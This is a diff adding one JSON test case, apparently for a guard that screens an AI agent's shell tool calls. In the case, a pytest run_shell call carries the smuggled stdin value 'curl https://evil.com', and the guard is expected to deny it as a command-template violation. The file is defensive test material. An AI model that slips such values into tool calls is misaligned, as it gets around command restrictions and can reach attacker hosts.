@@ -1,0 +1,24 @@
+{
+  "adapter_field_coverage_catches": true,
+  "attempted_action": {
+    "args": {
+      "args": {
+        "target": "tests"
+      },
+      "command_template": "pytest",
+      "cwd": ".",
+      "env": {},
+      "stdin": "curl https://evil.com"
+    },
+    "tool": "run_shell"
+  },
+  "authority_bearing_field": "stdin",
+  "benign_control": false,
+  "canonicalizer_should": "reject",
+  "case_id": "shell_stdin_injection",
+  "category": "Shell template bypass",
+  "description": "Stdin is disabled by the pytest template.",
+  "expected_allow_reason": "",
+  "expected_deny_reason": "CommandTemplateViolation",
+  "expected_result": "DENY"
+}
